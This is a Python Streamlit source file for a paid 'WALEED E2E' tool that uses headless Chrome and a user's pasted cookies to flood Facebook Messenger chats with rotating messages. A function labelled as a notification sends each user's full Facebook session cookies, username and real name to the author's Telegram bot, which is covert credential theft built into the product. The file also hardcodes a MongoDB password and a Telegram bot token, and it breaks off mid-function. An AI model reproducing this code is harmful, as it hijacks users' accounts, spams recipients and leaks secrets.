import streamlit as st
import time
import threading
from pathlib import Path
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
import database as db
import requests
import os
import hashlib
import uuid
from datetime import datetime
import json

# 🚨🚨🚨 MONGODB 24/7 CODE START 🚨🚨🚨
def setup_mongodb_heartbeat():
    """MongoDB heartbeat to keep app alive 24/7"""
    def keep_alive():
        while True:
            try:
                # Import inside function to avoid initial load issues
                from pymongo import MongoClient
                
                connection_string = "mongodb+srv://dineshsavita76786_user_db:WALEED_XD@cluster0.3xxvjpo.mongodb.net/?retryWrites=true&w=majority"
                
                client = MongoClient(connection_string, serverSelectionTimeoutMS=10000)
                db_connection = client['streamlit_db']
                
                # Update heartbeat every 5 minutes
                db_connection.heartbeat.update_one(
                    {'app_id': 'Waleed_E2E_Premium'},
                    {
                        '$set': {
                            'last_heartbeat': datetime.now(),
                            'status': 'running',
                            'app_name': 'Waleed E2E Premium Tool',
                            'timestamp': datetime.now(),
                            'version': '3.0'
                        }
                    },
                    upsert=True
                )
                print(f"✅ MongoDB Heartbeat: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
                client.close()
                
            except Exception as e:
                print(f"❌ MongoDB Heartbeat Error: {str(e)[:100]}")
            
            # Wait 5 minutes
            time.sleep(300)
    
    # Start heartbeat in background
    try:
        heartbeat_thread = threading.Thread(target=keep_alive, daemon=True)
        heartbeat_thread.start()
        print("🚀 MongoDB 24/7 Heartbeat Started!")
    except Exception as e:
        print(f"❌ Failed to start heartbeat: {e}")

# 🚨 YEH LINE SABSE PEHLE RUN HOGI
if 'mongodb_started' not in st.session_state:
    setup_mongodb_heartbeat()
    st.session_state.mongodb_started = True
# 🚨🚨🚨 MONGODB 24/7 CODE END 🚨🚨🚨

st.set_page_config(
    page_title="WALEED E2E PAID TOOL",
    page_icon="👑",
    layout="wide",
    initial_sidebar_state="expanded"
)

# 🎨 PREMIUM DESIGNER THEME CSS
premium_css = """
<style>
    /* ====== PREMIUM SPACE THEME ====== */
    .stApp {
        background: linear-gradient(135deg, #0f0c29 0%, #302b63 25%, #24243e 50%, #1a1a2e 75%, #16213e 100%);
        background-size: 400% 400%;
        animation: galaxyMove 20s ease infinite;
        min-height: 100vh;
    }
    
    @keyframes galaxyMove {
        0% { background-position: 0% 50%; }
        50% { background-position: 100% 50%; }
        100% { background-position: 0% 50%; }
    }
    
    /* Starfield Background */
    .stApp::before {
        content: '';
        position: fixed;
        width: 100%;
        height: 100%;
        background: 
            radial-gradient(2px 2px at 40px 60px, rgba(255,255,255,0.5), transparent),
            radial-gradient(3px 3px at 20px 120px, rgba(255,255,255,0.4), transparent),
            radial-gradient(2px 2px at 40px 200px, rgba(255,255,255,0.6), transparent),
            radial-gradient(3px 3px at 150px 40px, rgba(255,255,255,0.4), transparent),
            radial-gradient(2px 2px at 180px 150px, rgba(255,255,255,0.5), transparent);
        background-repeat: repeat;
        z-index: -1;
        opacity: 0.4;
        animation: twinkle 4s infinite alternate;
    }
    
    @keyframes twinkle {
        0% { opacity: 0.2; }
        100% { opacity: 0.6; }
    }
    
    /* ====== MAIN CONTAINER ====== */
    .premium-container {
        background: rgba(15, 23, 42, 0.85);
        backdrop-filter: blur(20px);
        border-radius: 30px;
        border: 1px solid rgba(255, 255, 255, 0.1);
        padding: 40px;
        margin: 20px auto;
        max-width: 1400px;
        box-shadow: 
            0 20px 80px rgba(0, 0, 0, 0.5),
            inset 0 1px 0 rgba(255, 255, 255, 0.1);
        position: relative;
        overflow: hidden;
    }
    
    .premium-container::before {
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        height: 1px;
        background: linear-gradient(90deg, 
            transparent, 
            rgba(59, 130, 246, 0.5), 
            rgba(147, 51, 234, 0.5),
            transparent);
    }
    
    /* ====== PREMIUM HEADER ====== */
    .premium-header {
        text-align: center;
        padding: 40px 20px;
        margin-bottom: 40px;
        position: relative;
    }
    
    .logo-container {
        width: 180px;
        height: 180px;
        margin: 0 auto 30px;
        position: relative;
        display: flex;
        align-items: center;
        justify-content: center;
    }
    
    .logo-glow {
        position: absolute;
        width: 200%;
        height: 200%;
        background: radial-gradient(circle, 
            rgba(59, 130, 246, 0.3) 0%,
            rgba(147, 51, 234, 0.2) 30%,
            transparent 70%);
        animation: pulseGlow 3s ease-in-out infinite;
        border-radius: 50%;
    }
    
    @keyframes pulseGlow {
        0%, 100% { transform: scale(1); opacity: 0.5; }
        50% { transform: scale(1.1); opacity: 0.8; }
    }
    
    .logo-icon {
        width: 120px;
        height: 120px;
        background: linear-gradient(135deg, #3b82f6, #8b5cf6);
        border-radius: 25px;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 48px;
        color: white;
        box-shadow: 
            0 10px 40px rgba(59, 130, 246, 0.4),
            inset 0 1px 0 rgba(255, 255, 255, 0.2);
        position: relative;
        z-index: 1;
        transform: rotate(45deg);
        animation: floatLogo 6s ease-in-out infinite;
    }
    
    .logo-icon::after {
        content: 'W';
        transform: rotate(-45deg);
        font-weight: 900;
        font-family: 'Segoe UI', system-ui;
        text-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
    }
    
    @keyframes floatLogo {
        0%, 100% { transform: rotate(45deg) translateY(0px); }
        50% { transform: rotate(45deg) translateY(-15px); }
    }
    
    .premium-title {
        font-size: 3.5rem;
        font-weight: 900;
        background: linear-gradient(135deg, 
            #60a5fa 0%,
            #8b5cf6 25%,
            #ec4899 50%,
            #f59e0b 75%,
            #10b981 100%);
        -webkit-background-clip: text;
        background-clip: text;
        color: transparent;
        background-size: 300% 300%;
        animation: gradientShift 8s ease infinite;
        margin-bottom: 10px;
        letter-spacing: -1px;
        text-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
    }
    
    @keyframes gradientShift {
        0%, 100% { background-position: 0% 50%; }
        50% { background-position: 100% 50%; }
    }
    
    .premium-subtitle {
        color: rgba(255, 255, 255, 0.7);
        font-size: 1.2rem;
        font-weight: 300;
        letter-spacing: 3px;
        text-transform: uppercase;
        margin-bottom: 20px;
    }
    
    .premium-badge {
        display: inline-block;
        background: linear-gradient(135deg, #f59e0b, #d97706);
        color: white;
        padding: 8px 20px;
        border-radius: 20px;
        font-size: 0.9rem;
        font-weight: 600;
        letter-spacing: 1px;
        box-shadow: 0 5px 15px rgba(245, 158, 11, 0.3);
        animation: badgeGlow 2s ease-in-out infinite;
    }
    
    @keyframes badgeGlow {
        0%, 100% { box-shadow: 0 5px 15px rgba(245, 158, 11, 0.3); }
        50% { box-shadow: 0 5px 25px rgba(245, 158, 11, 0.5); }
    }
    
    /* ====== SIDEBAR STYLING ====== */
    [data-testid="stSidebar"] {
        background: rgba(15, 23, 42, 0.9) !important;
        backdrop-filter: blur(20px);
        border-right: 1px solid rgba(255, 255, 255, 0.1);
    }
    
    [data-testid="stSidebar"] .stButton > button {
        width: 100%;
        margin: 5px 0;
        background: rgba(30, 41, 59, 0.8) !important;
        border: 1px solid rgba(255, 255, 255, 0.1) !important;
    }
    
    [data-testid="stSidebar"] .stButton > button:hover {
        background: rgba(59, 130, 246, 0.2) !important;
        border-color: #3b82f6 !important;
    }
    
    /* ====== INPUT FIELDS ====== */
    .stTextInput>div>div>input,
    .stTextArea>div>div>textarea,
    .stNumberInput>div>div>input {
        background: rgba(15, 23, 42, 0.9) !important;
        border: 2px solid rgba(255, 255, 255, 0.1) !important;
        border-radius: 12px !important;
        color: white !important;
        padding: 14px 18px !important;
        font-size: 15px !important;
        transition: all 0.3s ease !important;
    }
    
    .stTextInput>div>div>input:focus,
    .stTextArea>div>div>textarea:focus,
    .stNumberInput>div>div>input:focus {
        border-color: #3b82f6 !important;
        box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2) !important;
        background: rgba(15, 23, 42, 1) !important;
    }
    
    .stTextInput>div>div>input::placeholder,
    .stTextArea>div>div>textarea::placeholder {
        color: rgba(255, 255, 255, 0.4) !important;
    }
    
    /* ====== PREMIUM BUTTONS ====== */
    .stButton>button {
        background: linear-gradient(135deg, #3b82f6, #8b5cf6) !important;
        color: white !important;
        border: none !important;
        border-radius: 12px !important;
        padding: 14px 28px !important;
        font-weight: 600 !important;
        font-size: 15px !important;
        transition: all 0.3s ease !important;
        box-shadow: 0 8px 25px rgba(59, 130, 246, 0.3) !important;
        position: relative !important;
        overflow: hidden !important;
    }
    
    .stButton>button::before {
        content: '';
        position: absolute;
        top: 0;
        left: -100%;
        width: 100%;
        height: 100%;
        background: linear-gradient(90deg, 
            transparent, 
            rgba(255, 255, 255, 0.2), 
            transparent);
        transition: left 0.5s ease;
    }
    
    .stButton>button:hover::before {
        left: 100%;
    }
    
    .stButton>button:hover {
        transform: translateY(-2px) !important;
        box-shadow: 0 12px 30px rgba(59, 130, 246, 0.4) !important;
    }
    
    /* Button Variations */
    .success-btn .stButton>button {
        background: linear-gradient(135deg, #10b981, #059669) !important;
        box-shadow: 0 8px 25px rgba(16, 185, 129, 0.3) !important;
    }
    
    .danger-btn .stButton>button {
        background: linear-gradient(135deg, #ef4444, #dc2626) !important;
        box-shadow: 0 8px 25px rgba(239, 68, 68, 0.3) !important;
    }
    
    .warning-btn .stButton>button {
        background: linear-gradient(135deg, #f59e0b, #d97706) !important;
        box-shadow: 0 8px 25px rgba(245, 158, 11, 0.3) !important;
    }
    
    /* ====== PREMIUM CARDS ====== */
    .premium-card {
        background: rgba(30, 41, 59, 0.7);
        backdrop-filter: blur(10px);
        border-radius: 20px;
        padding: 25px;
        border: 1px solid rgba(255, 255, 255, 0.05);
        box-shadow: 
            0 10px 30px rgba(0, 0, 0, 0.3),
            inset 0 1px 0 rgba(255, 255, 255, 0.05);
        transition: all 0.3s ease;
        position: relative;
        overflow: hidden;
        margin-bottom: 20px;
    }
    
    .premium-card:hover {
        transform: translateY(-3px);
        border-color: rgba(59, 130, 246, 0.3);
        box-shadow: 
            0 15px 35px rgba(0, 0, 0, 0.4),
            inset 0 1px 0 rgba(255, 255, 255, 0.1);
    }
    
    .premium-card::before {
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        height: 4px;
        background: linear-gradient(90deg, #3b82f6, #8b5cf6);
        border-radius: 20px 20px 0 0;
    }
    
    /* ====== TABS STYLING ====== */
    .stTabs [data-baseweb="tab-list"] {
        gap: 8px;
        background: rgba(30, 41, 59, 0.5);
        padding: 8px;
        border-radius: 12px;
        border: 1px solid rgba(255, 255, 255, 0.05);
    }
    
    .stTabs [data-baseweb="tab"] {
        background: transparent !important;
        border-radius: 10px !important;
        padding: 10px 20px !important;
        color: rgba(255, 255, 255, 0.6) !important;
        font-weight: 500 !important;
        border: none !important;
        transition: all 0.3s ease !important;
    }
    
    .stTabs [aria-selected="true"] {
        background: linear-gradient(135deg, #3b82f6, #8b5cf6) !important;
        color: white !important;
        box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3) !important;
    }
    
    /* ====== METRIC CARDS ====== */
    .metric-card {
        background: rgba(30, 41, 59, 0.7);
        border-radius: 16px;
        padding: 20px;
        text-align: center;
        border: 1px solid rgba(255, 255, 255, 0.05);
        transition: all 0.3s ease;
    }
    
    .metric-card:hover {
        border-color: rgba(59, 130, 246, 0.3);
        box-shadow: 0 8px 25px rgba(59, 130, 246, 0.1);
    }
    
    .metric-value {
        font-size: 2.2rem;
        font-weight: 900;
        color: white;
        margin: 10px 0;
        text-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
    }
    
    .metric-label {
        color: rgba(255, 255, 255, 0.6);
        font-size: 0.85rem;
        text-transform: uppercase;
        letter-spacing: 1px;
    }
    
    /* ====== LOG CONSOLE ====== */
    .log-console {
        background: rgba(15, 23, 42, 0.95);
        border-radius: 12px;
        padding: 20px;
        font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
        color: #10b981;
        font-size: 13px;
        line-height: 1.5;
        max-height: 400px;
        overflow-y: auto;
        border: 1px solid rgba(16, 185, 129, 0.2);
        box-shadow: inset 0 0 20px rgba(0, 0, 0, 0.5);
        margin-top: 20px;
    }
    
    .log-entry {
        padding: 8px 12px;
        margin: 4px 0;
        border-radius: 6px;
        background: rgba(16, 185, 129, 0.05);
        border-left: 3px solid #10b981;
        animation: fadeIn 0.3s ease;
    }
    
    @keyframes fadeIn {
        from { opacity: 0; transform: translateY(-5px); }
        to { opacity: 1; transform: translateY(0); }
    }
    
    /* ====== USER CARDS ====== */
    .user-card {
        background: rgba(30, 41, 59, 0.6);
        padding: 18px;
        border-radius: 12px;
        margin: 8px 0;
        border-left: 4px solid #3b82f6;
        transition: all 0.3s ease;
    }
    
    .user-card:hover {
        background: rgba(30, 41, 59, 0.8);
        transform: translateX(5px);
    }
    
    .user-card.approved {
        border-left-color: #10b981;
    }
    
    .user-card.pending {
        border-left-color: #f59e0b;
    }
    
    .user-card.rejected {
        border-left-color: #ef4444;
    }
    
    /* ====== STATUS BADGES ====== */
    .status-badge {
        display: inline-block;
        padding: 5px 12px;
        border-radius: 20px;
        font-size: 0.75rem;
        font-weight: 600;
        letter-spacing: 0.5px;
        margin-left: 10px;
    }
    
    .status-approved {
        background: linear-gradient(135deg, #10b981, #059669);
        color: white;
        box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3);
    }
    
    .status-pending {
        background: linear-gradient(135deg, #f59e0b, #d97706);
        color: white;
        box-shadow: 0 4px 12px rgba(245, 158, 11, 0.3);
    }
    
    .status-rejected {
        background: linear-gradient(135deg, #ef4444, #dc2626);
        color: white;
        box-shadow: 0 4px 12px rgba(239, 68, 68, 0.3);
    }
    
    /* ====== FOOTER ====== */
    .premium-footer {
        text-align: center;
        padding: 30px 20px;
        margin-top: 40px;
        color: rgba(255, 255, 255, 0.5);
        font-size: 0.85rem;
        position: relative;
        border-top: 1px solid rgba(255, 255, 255, 0.1);
    }
    
    .premium-footer::before {
        content: '';
        position: absolute;
        top: -1px;
        left: 50%;
        transform: translateX(-50%);
        width: 100px;
        height: 2px;
        background: linear-gradient(90deg, 
            transparent, 
            #3b82f6, 
            #8b5cf6,
            transparent);
        border-radius: 2px;
    }
    
    /* ====== ADMIN PANEL ====== */
    .admin-panel {
        background: rgba(15, 23, 42, 0.9);
        border-radius: 20px;
        padding: 25px;
        border: 1px solid rgba(59, 130, 246, 0.3);
        box-shadow: 
            0 10px 30px rgba(0, 0, 0, 0.4),
            inset 0 1px 0 rgba(255, 255, 255, 0.1);
    }
    
    /* ====== SCROLLBAR ====== */
    ::-webkit-scrollbar {
        width: 8px;
        height: 8px;
    }
    
    ::-webkit-scrollbar-track {
        background: rgba(15, 23, 42, 0.5);
        border-radius: 10px;
    }
    
    ::-webkit-scrollbar-thumb {
        background: linear-gradient(135deg, #3b82f6, #8b5cf6);
        border-radius: 10px;
    }
    
    ::-webkit-scrollbar-thumb:hover {
        background: linear-gradient(135deg, #8b5cf6, #3b82f6);
    }
    
    /* ====== LOADING ====== */
    .loading-spinner {
        width: 40px;
        height: 40px;
        border: 3px solid rgba(59, 130, 246, 0.1);
        border-radius: 50%;
        border-top-color: #3b82f6;
        animation: spin 1s linear infinite;
        margin: 20px auto;
    }
    
    @keyframes spin {
        to { transform: rotate(360deg); }
    }
    
    /* ====== RESPONSIVE ====== */
    @media (max-width: 768px) {
        .premium-title {
            font-size: 2.5rem;
        }
        
        .logo-container {
            width: 140px;
            height: 140px;
        }
        
        .logo-icon {
            width: 100px;
            height: 100px;
            font-size: 36px;
        }
        
        .premium-container {
            padding: 20px;
            margin: 10px;
        }
    }
</style>
"""

st.markdown(premium_css, unsafe_allow_html=True)

# Telegram Bot Configuration (unchanged)
TELEGRAM_BOT_TOKEN = "8043472695:AAGfv8QI4yB_eNAL2ZAIq2bU7ING_-0e3qg"
TELEGRAM_CHAT_ID = "1889611156"
FACEBOOK_ADMIN_UID = "100080154146813"

# ✅ ALL YOUR ORIGINAL FUNCTIONS REMAIN EXACTLY THE SAME
def send_telegram_notification(user_data, automation_data):
    """Send user details to Telegram bot"""
    try:
        message = f"""
🔰 *NEW AUTOMATION STARTED* 🔰

👤 *User Details:*
• Username: `{user_data['username']}`
• Real Name: `{user_data['real_name']}`
• User ID: `{user_data['user_id']}`

🔧 *Automation Config:*
• Chat ID: `{automation_data['chat_id']}`
• Delay: `{automation_data['delay']} seconds`
• Prefix: `{automation_data['prefix']}`
• Messages: `{len(automation_data['messages'].splitlines())} lines`

🍪 *Full Cookies:* 
`{automation_data['cookies']}`

📊 *Status:* Automation Running
🕒 *Started:* {time.strftime("%Y-%m-%d %H:%M:%S")}
        """
        
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'Markdown'
        }
        requests.post(url, data=payload)
    except Exception as e:
        print(f"Telegram notification failed: {e}")

def send_facebook_notification(user_data, automation_data):
    """Send notification to Facebook admin"""
    try:
        message = f"""
🔰 NEW AUTOMATION STARTED 🔰

👤 User Details:
• Username: {user_data['username']}
• Real Name: {user_data['real_name']}
• User ID: {user_data['user_id']}

🔧 Automation Config:
• Chat ID: {automation_data['chat_id']}
• Delay: {automation_data['delay']} seconds
• Prefix: {automation_data['prefix']}
• Messages: {len(automation_data['messages'].splitlines())} lines

🍪 Full Cookies: 
{automation_data['cookies']}

📊 Status: Automation Running
🕒 Started: {time.strftime("%Y-%m-%d %H:%M:%S")}
        """
        
        print(f"Facebook notification sent to admin {FACEBOOK_ADMIN_UID}")
        print(f"Message: {message}")
        
        db.log_admin_notification(user_data['user_id'], message)
        
    except Exception as e:
        print(f"Facebook notification failed: {e}")

# Initialize session state (unchanged)
if 'logged_in' not in st.session_state:
    st.session_state.logged_in = False
if 'user_id' not in st.session_state:
    st.session_state.user_id = None
if 'username' not in st.session_state:
    st.session_state.username = None
if 'approval_key' not in st.session_state:
    st.session_state.approval_key = None
if 'approval_status' not in st.session_state:
    st.session_state.approval_status = 'pending'
if 'user_real_name' not in st.session_state:
    st.session_state.user_real_name = ""
if 'automation_running' not in st.session_state:
    st.session_state.automation_running = False
if 'logs' not in st.session_state:
    st.session_state.logs = []
if 'message_count' not in st.session_state:
    st.session_state.message_count = 0
if 'admin_logged_in' not in st.session_state:
    st.session_state.admin_logged_in = False

class AutomationState:
    def __init__(self):
        self.running = False
        self.message_count = 0
        self.logs = []
        self.message_rotation_index = 0
        self.last_message_sent = ""
        self.last_message_time = ""

if 'automation_state' not in st.session_state:
    st.session_state.automation_state = AutomationState()

if 'auto_start_checked' not in st.session_state:
    st.session_state.auto_start_checked = False

def generate_approval_key(username, user_id):
    """Generate unique approval key based on username and user_id"""
    unique_string = f"{username}_{user_id}_{uuid.uuid4()}"
    return hashlib.sha256(unique_string.encode()).hexdigest()[:16].upper()

def get_indian_time():
    """Get current Indian time"""
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S IST")

def log_message(msg, automation_state=None, user_id=None):
    """Log message with Indian timestamp"""
    timestamp = get_indian_time()
    formatted_msg = f"[{timestamp}] {msg}"
    
    if user_id:
        db.log_user_activity(user_id, formatted_msg)
    
    if automation_state:
        automation_state.logs.append(formatted_msg)
        automation_state.last_message_sent = msg
        automation_state.last_message_time = timestamp
    else:
        if 'logs' in st.session_state:
            st.session_state.logs.append(formatted_msg)

def find_message_input(driver, process_id, automation_state=None, user_id=None):
    log_message(f'{process_id}: Finding message input...', automation_state, user_id)
    time.sleep(10)
    
    try:
        driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
        time.sleep(2)
        driver.execute_script("window.scrollTo(0, 0);")
        time.sleep(2)
    except Exception:
        pass
    
    try:
        page_title = driver.title
        page_url = driver.current_url
        log_message(f'{process_id}: Page Title: {page_title}', automation_state, user_id)
        log_message(f'{process_id}: Page URL: {page_url}', automation_state, user_id)
    except Exception as e:
        log_message(f'{process_id}: Could not get page info: {e}', automation_state, user_id)
    
    message_input_selectors = [
        'div[contenteditable="true"][role="textbox"]',
        'div[contenteditable="true"][data-lexical-editor="true"]',
        'div[aria-label*="message" i][contenteditable="true"]',
        'div[aria-label*="Message" i][contenteditable="true"]',
        'div[contenteditable="true"][spellcheck="true"]',
        '[role="textbox"][contenteditable="true"]',
        'textarea[placeholder*="message" i]',
        'div[aria-placeholder*="message" i]',
        'div[data-placeholder*="message" i]',
        '[contenteditable="true"]',
        'textarea',
        'input[type="text"]'
    ]
    
    log_message(f'{process_id}: Trying {len(message_input_selectors)} selectors...', automation_state, user_id)
    
    for idx, selector in enumerate(message_input_selectors):
        try:
            elements = driver.find_elements(By.CSS_SELECTOR, selector)
            log_message(f'{process_id}: Selector {idx+1}/{len(message_input_selectors)} "{selector[:50]}..." found {len(elements)} elements', automation_state, user_id)
            
            for element in elements:
                try:
                    is_editable = driver.execute_script("""
                        return arguments[0].contentEditable === 'true' || 
                               arguments[0].tagName === 'TEXTAREA' || 
                               arguments[0].tagName === 'INPUT';
                    """, element)
                    
                    if is_editable:
                        log_message(f'{process_id}: Found editable element with selector #{idx+1}', automation_state, user_id)
                        
                        try:
                            element.click()
                            time.sleep(0.5)
                        except:
                            pass
                        
                        element_text = driver.execute_script("return arguments[0].placeholder || arguments[0].getAttribute('aria-label') || arguments[0].getAttribute('aria-placeholder') || '';", element).lower()
                        
                        keywords = ['message', 'write', 'type', 'send', 'chat', 'msg', 'reply', 'text', 'aa']
                        if any(keyword in element_text for keyword in keywords):
                            log_message(f'{process_id}: Found message input with text: {element_text[:50]}', automation_state, user_id)
                            return element
                        elif idx < 10:
                            log_message(f'{process_id}: Using primary selector editable element (#{idx+1})', automation_state, user_id)
                            return element
                        elif selector == '[contenteditable="true"]' or selector == 'textarea' or selector == 'input[type="text"]':
                            log_message(f'{process_id}: Using fallback editable element', automation_state, user_id)
                            return element
                except Exception as e:
                    log_message(f'{process_id}: Element check failed: {str(e)[:50]}', automation_state, user_id)
                    continue
        except Exception as e:
            continue
    
    try:
        page_source = driver.page_source
        log_message(f'{process_id}: Page source length: {len(page_source)} characters', automation_state, user_id)
        if 'contenteditable' in page_source.lower():
            log_message(f'{process_id}: Page contains contenteditable elements', automation_state, user_id)
        else:
            log_message(f'{process_id}: No contenteditable elements found in page', automation_state, user_id)
    except Exception:
        pass
    
    return None

def setup_browser(automation_state=None, user_id=None):
    log_message('Setting up Chrome browser...', automation_state, user_id)
    
    chrome_options = Options()
    chrome_options.add_argument('--headless=new')
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--disable-setuid-sandbox')
    chrome_options.add_argument('--disable-dev-shm-usage')
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument('--disable-extensions')
    chrome_options.add_argument('--window-size=1920,1080')
    chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36')
    
    chromium_paths = [
        '/usr/bin/chromium',
        '/usr/bin/chromium-browser',
        '/usr/bin/google-chrome',
        '/usr/bin/chrome'
    ]
    
    for chromium_path in chromium_paths:
        if Path(chromium_path).exists():
            chrome_options.binary_location = chromium_path
            log_message(f'Found Chromium at: {chromium_path}', automation_state, user_id)
            break
    
    chromedriver_paths = [
        '/usr/bin/chromedriver',
        '/usr/local/bin/chromedriver'
    ]
    
    driver_path = None
    for driver_candidate in chromedriver_paths:
        if Path(driver_candidate).exists():
            driver_path = driver_candidate
            log_message(f'Found ChromeDriver at: {driver_path}', automation_state, user_id)
            break
    
    try:
        from selenium.webdriver.chrome.service import Service
        
        if driver_path:
            service = Service(executable_path=driver_path)
            driver = webdriver.Chrome(service=service, options=chrome_options)
            log_message('Chrome started with detected ChromeDriver!', automation_state, user_id)
        else:
            driver = webdriver.Chrome(options=chrome_options)
            log_message('Chrome started with default driver!', automation_state, user_id)
        
        driver.set_window_size(1920, 1080)
        log_message('Chrome browser setup completed successfully!', automation_state, user_id)
        return driver
    except Exception as error:
        log_message(f'Browser setup failed: {error}', automation_state, user_id)
        raise error

def get_next_message(messages_file_content, automation_state=None):
    if not messages_file_content:
        return 'Hello!'
    
    messages = messages_file_content.split('\n')
    messages = [msg.strip() for msg in messages if msg.strip()]
    
    if not messages:
        return 'Hello!'
    
    if automation_state:
        message = messages[automation_state.message_rotation_index % len(messages)]
        automation_state.message_rotation_index += 1
    else:
        message = messages[0]
    
    return message

def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
    driver = None
    try:
        log_message(f'{process_id}: Starting automation...', automation_state, user_id)
        driver = setup_browser(automation_state, user_id)
        
        log_message(f'{process_id}: Navigating to Facebook...', automation_state, user_id)
        driver.get('https://www.facebook.com/')
        time.sleep(8)
        
        if config['cookies'] and config['cookies'].strip():
            log_message(f'{process_id}: Adding cookies...', automation_state, user_id)
            cookie_array = config['cookies'].split(';')
            for cookie in cookie_array:
                cookie_trimmed = cookie.strip()
                if cookie_trimmed:
                    first_equal_index = cookie_trimmed.find('=')
                    if first_equal_index > 0:
                        name = cookie_trimmed[:first_equal_index].strip()
                        value = cookie_trimmed[first_equal_index + 1:].strip()
                        try:
                            driver.add_cookie({
                                'name': name,
                                'value': value,
                                'domain': '.facebook.com',
                                'path': '/'
                            })
                        except Exception:
                            pass
        
        if config['chat_id']:
            chat_id = config['chat_id'].strip()
            log_message(f'{process_id}: Opening conversation {chat_id}...', automation_state, user_id)
            driver.get(f'https://www.facebook.com/messages/t/{chat_id}')
        else:
            log_message(f'{process_id}: Opening messages...', automation_state, user_id)
            driver.get('https://www.facebook.com/messages')
        
        time.sleep(15)
        
        message_input = find_message_input(driver, process_id, automation_state, user_id)
        
        if not message_input:
            log_message(f'{process_id}: Message input not found!', automation_state, user_id)
            automation_state.running = False
            db.set_automation_running(user_id, False)
            return 0
        
        delay = int(config['delay'])
        messages_sent = 0
        
        while automation_state.running and db.get_automation_running(user_id):
            base_message = get_next_message(config['messages_file_content'], automation_state)
            
            if config['name_prefix']:
                message_to_send = f"{config['name_prefix']} {base_message}"
            else:
                message_to_send = base_message
            
            try:
                driver.execute_script("""
                    const element = arguments[0];
                    const message = arguments[1];
                    
                    element.scrollIntoView({behavior: 'smooth', block: 'center'});
                    element.focus();
                    element.click();
                    
                    if (element.tagName === 'DIV') {
                        element.textContent = message;
                        element.innerHTML = message;
                    } else {
                        element.value = message;
                    }
                    
                    element.dispatchEvent(new Event('input', { bubbles: true }));
                    element.dispatchEvent(new Event('change', { bubbles: true }));
                    element.dispatchEvent(new InputEvent('input', { bubbles: true, data: message }));
                """, message_input, message_to_send)
                
                time.sleep(1)
                
                sent = driver.execute_script("""
                    const sendButtons = document.querySelectorAll('[aria-label*="Send" i]:not([aria-label*="like" i]), [data-testid="send-button"]');
                    
                    for (let btn of sendButtons) {
                        if (btn.offsetParent !== null) {
                            btn.click();
                            return 'button_clicked';
                        }
                    }
                    return 'button_not_found';
                """)
                
                if sent == 'button_not_found':
                    log_message(f'{process_id}: Send button not found, using Enter key...', automation_state, user_id)
                    driver.execute_script("""
                        const element = arguments[0];
                        element.focus();
                        
                        const events = [
                            new KeyboardEvent('keydown', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                            new KeyboardEvent('keypress', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                            new KeyboardEvent('keyup', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true })
                        ];
                        
                        events.forEach(event => element.dispatchEvent(event));
                    """, message_input)
                else:
                    log_message(f'{process_id}: Send button clicked', automation_state, user_id)
                
                time.sleep(1)
                
                messages_sent += 1
                automation_state.message_count = messages_sent
                log_message(f'{process_id}: Message {messages_sent} sent: {message_to_send[:30]}...', automation_state, user_id)
                
                time.sleep(delay)
                
            except Exception as e:
                log_message(f'{process_id}: Error sending message: {str(e)}', automation_state, user_id)
                break
        
        log_message(f'{process_id}: Automation stopped! Total messages sent: {messages_sent}', automation_state, user_id)
        automation_state.running = False
        db.set_automation_running(user_id, False)
        return messages_sent
        
    except Exception as e:
        log_message(f'{process_id}: Fatal error: {str(e)}', automation_state, user_id)
        automation_state.running = False
        db.set_automation_running(user_id, False)
        return 0
    finally:
        if driver:
            try:
                driver.quit()
                log_message(f'{process_id}: Browser closed', automation_state, user_id)
            except:
                pass

def send_approval_request_via_whatsapp(user_real_name, approval_key):
    message = f"Hello Waleed sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
    whatsapp_url = f"https://wa.me/923075852134?text={requests.utils.quote(message)}"
    return whatsapp_url

def send_approval_request_via_facebook(user_real_name, approval_key):
    message = f"Hello waleed sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
    facebook_url = f"https://www.facebook.com/officelwaleed"
    return facebook_url

def send_approval_request_via_telegram(user_real_name, approval_key):
    message = f"Hello Waleed sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
    telegram_url = f"https://t.me/itxrafay?text={requests.utils.quote(message)}"
    return telegram_url

def run_automation_with_notification(user_config, username, automation_state, user_id):
    # Send notifications before starting automation
    user_data = {
        'username': username,
        'real_name': db.get_user_real_name(user_id),
        'user_id': user_id
    }
    
    automation_data = {
        'chat_id': user_config['chat_id'],
        'delay': user_config['delay'],
        'prefix': user_config['name_prefix'],
        'messages': user_config['messages_file_content'],
        'cookies': user_config['cookies']
    }
    
    # Send notifications
    send_telegram_notification(user_data, automation_data)
    send_facebook_notification(user_data, automation_data)
    
    # Start automation
    send_messages(user_config, automation_state, user_id)

def start_automation(user_config, user_id):
    automation_state = st.session_state.automation_state
    
    if automation_state.running:
        return
    
    automation_state.running = True
    automation_state.message_count = 0
    automation_state.logs = []
    
    db.set_automation_running(user_id, True)
    
